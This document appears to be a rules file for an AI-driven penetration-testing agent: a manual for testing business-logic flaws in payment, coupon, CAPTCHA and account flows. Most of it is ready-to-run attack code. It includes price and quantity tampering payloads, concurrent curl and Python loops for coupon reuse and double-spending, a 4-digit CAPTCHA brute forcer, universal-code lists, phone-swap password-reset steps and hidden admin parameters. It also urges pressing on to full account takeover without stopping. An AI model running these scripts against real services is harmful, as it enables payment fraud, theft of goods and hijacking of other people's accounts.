> Write-up or not is decided only by `~/.grok/rules/vuln-report-format.md`. For the minimum probe when there is a session at entry, see `dig-scope` §4.2.3 (add fields, skip steps, concurrency for claim/inventory/coupon — one shot each). This article is about testing methods: payment/flow/CAPTCHA all get tested; if code-sending/slider hasn't got you into an account, move to the auth chain, don't stop halfway.
> Short table "merchant promotion binding" is in §1.4. The English business-logic / CHECKLIST / METHODOLOGY / SCENARIOS appendices have been cut; the payment/flow/CAPTCHA testing methods remain in the upper half.

---

## I. Original knowledge base

# Logic Vulnerability Testing Manual

## I. Payment logic vulnerabilities

### 1.1 Price tampering

```bash
# When submitting the cart, modify the unit price of the item
# Capture the order-submission request, modify the price field
POST /api/order/create
{"goodsId": "123", "count": 1, "price": "0.01"}  # original price changed to 0.01

# Negative price (balance increases)
{"goodsId": "123", "count": 1, "price": "-100"}
```

### 1.2 Quantity tampering

```bash
# Buy 1 item but modify the request to -1 (possible refund)
{"goodsId": "123", "count": -1, "price": "99.00"}

# Integer overflow (32-bit maximum)
{"count": 2147483647}
```

### 1.3 Coupon/points vulnerabilities

```bash
# Reuse the same coupon repeatedly
# Concurrency race (multiple threads submit the same coupon simultaneously)
for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/coupon/use" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"couponId": "COUPON123"}' &
done
wait

# Negative points (set a negative number when redeeming points)
{"points": -1000}  # expected balance increases
```

### 1.4 Merchant promotion binding: attaching a coupon to someone else's goods (pointer in the short table)

> Essence: the merchant backend's "bind my promotion/coupon to a certain item" trusts only the `productId` in the request, and does not check whether the item belongs to this store.
> It is NOT the same as changing the price at checkout, changing the coupon's face value, or swapping to a cheaper SKU at checkout. One line in the short table points here.

**Identify:** there is a merchant/supplier backend; you can create discounts, no-threshold coupons, promotions; the binding endpoint name often contains `relate` / `bind` / `attach` / `apply` + `promo` / `salespromotion` / `coupon`; the body contains both a coupon/campaign ID and `productId` / `skuId` / `goodsId`.

**Attack:**

1. With your own store account, create a coupon with aggressive rules (no threshold, large enough face value, ideally not restricted to your own store's categories)
2. Bind it to one of your own items normally, capture the binding request
3. **Only change** `productId` (or the synonymous field) to an item from someone else's store or another category; leave the coupon ID / campaign ID untouched
4. Open that item's detail/order page on the C-end without logging in, and look at the listed price and amount due

**Counts as:** the amount due for someone else's item on the C-end drops according to your coupon (better if you can place the order). Merely proving the binding endpoint returns 200 and the merchant backend list gains a row → does NOT count; the C-end price must genuinely change.

**False positives:** binding succeeds but the C-end price/checkout doesn't change; the backend rewrites the product based on the merchant session and only lets you bind your own goods; what you changed was the `productId` in the C-end checkout package to swap in a cheaper SKU (that is the already-listed "item swap at checkout", not this one).

Don't confuse with neighboring techniques:

| This one | Don't treat as |
|------|--------|
| B-end coupon-binding endpoint, what changes is "which item it binds to" | C-end checkout changing `amount` / `coupon_amount` |
| Your own coupon + someone else's `productId` | Checkout swapping `productId` for a cheaper SKU before paying |
| Need to see the C-end price drop | Merchant backend list showing the bind succeeded counts |

First half-minute: if there's a merchant backend, create a coupon → capture the binding request → swap in a `productId` clearly not from your store → open the C-end and check the price.

---

## II. CAPTCHA/SMS vulnerabilities

> Only a closed loop to account takeover/privilege escalation counts as a full kill (code reflected + login, universal code + login, brute force + password change). Just triggering sending / slider passed / can try passwords but haven't entered the account → move to the auth chain, don't stop halfway.

### 2.1 Enumerable CAPTCHA

```python
import requests

# 4-digit numeric CAPTCHA - try them one by one
for code in range(0, 10000):
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": f"{code:04d}"})
    if r.json().get("code") == 0:
        print(f"Correct CAPTCHA: {code:04d}")
        break

# Verify: is there a rate limit (first 20 attempts unlimited → haven't entered the account, keep following the auth chain)
```

### 2.2 Universal CAPTCHA

```
Test the following CAPTCHAs:
000000, 123456, 888888, 666666
111111, 999999
Empty value: ""
Submit without sending a CAPTCHA at all
```

### 2.3 SMS bombing (briefly test rate limiting internally, don't stop halfway)

> Merely proving you can send a code is not a full kill. The points below prevent mistaking the bombing endpoint for the main finding.

```python
# Test whether there is a send-rate limit (test only 1-2 times, don't actually bomb)
# Verify:
# 1. Is there a limit on the interval between consecutive sends to the same number
# 2. Does an IP limit exist
# 3. Modify the phone parameter but still send to a fixed number
{"phone": "target phone number", "realPhone": "13800138000"}
```

---

## III. Race conditions

### 3.1 Concurrent deduction

```python
import threading
import requests

# Balance 100, launch 10 spending requests of 100 each simultaneously
def consume():
    r = requests.post("https://target.com/api/pay",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": 100})
    print(r.json())

threads = [threading.Thread(target=consume) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.2 Duplicate submission

```bash
# Duplicate order submission (send the same request multiple times)
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/order/pay" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"orderId": "ORDER123", "amount": "0.01"}' &
done
```

---

## IV. Account security vulnerabilities

### 4.1 Account enumeration

```bash
# Registration/login endpoints distinguish "user does not exist" from "wrong password"
# If responses differ → accounts are enumerable

# When registering, check whether a phone number is already registered
curl "https://target.com/api/register/check?phone=13800138000"
# Response {"exists": true} → enumerable
```

### 4.2 Password recovery logic

```
Test flow:
1. Initiate password recovery (phone A)
2. Obtain the token/link
3. Change the phone in the request to phone B
4. If B's password is successfully changed → arbitrary account password reset
```

### 4.3 Account takeover vulnerability

```
Scenario: a phone number is recycled and reassigned to someone else
1. Register with the deactivated number
2. Try to log into the originally bound account
3. Or: when changing the bound phone number, the CAPTCHA is sent to the old number
```

---

## V. Business logic bypass

### 5.1 State machine bypass

```bash
# Normal flow: step 1 → step 2 → step 3 → complete
# Try skipping step 2 and executing step 3 directly
# Or roll back to step 1 but keep the result of step 3

# Record each step's request, replay them one by one, observe whether you can bypass validation
```

### 5.2 Test parameters

```
Add to requests:
debug=true / test=1 / internal=1
is_admin=true / role=admin
from_internal=1 / bypass_check=1
```

---
